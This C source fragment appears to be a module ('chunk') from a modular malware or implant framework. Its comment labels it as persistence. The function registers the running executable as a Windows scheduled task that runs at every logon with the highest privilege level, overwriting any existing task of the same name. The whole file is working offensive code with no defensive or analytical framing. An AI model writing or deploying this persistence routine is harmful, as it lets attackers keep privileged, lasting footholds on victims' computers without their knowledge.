// chunk: persist/scheduled_task
// depends: core/run_cmd
// provides: persist_scheduled_task
// headers: windows.h
// note: Create scheduled task for persistence — runs at logon

#ifndef CHUNK_PERSIST_SCHTASK
#define CHUNK_PERSIST_SCHTASK

static int persist_scheduled_task(const char *task_name) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "cmd /c schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f",
             task_name, path);

    char out[256] = {0};
    DWORD olen = 0;
    run_cmd(cmd, out, sizeof(out), &olen);
    return (olen > 0 && strstr(out, "SUCCESS") != NULL);
}

#endif
